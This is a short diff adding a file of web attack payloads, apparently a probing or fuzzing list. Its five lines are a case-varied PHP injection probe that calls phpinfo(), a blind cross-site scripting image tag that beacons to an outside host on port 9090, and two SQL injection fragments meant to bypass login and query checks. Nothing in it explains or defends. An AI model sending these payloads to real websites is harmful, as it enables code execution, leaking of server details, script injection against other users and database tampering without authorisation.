@@ -1,0 +1,5 @@
+<?pHp phpinfo() ?>
+<img src=http://10.10.10.10:9090/bxss>
+'or1=1
+' --
+
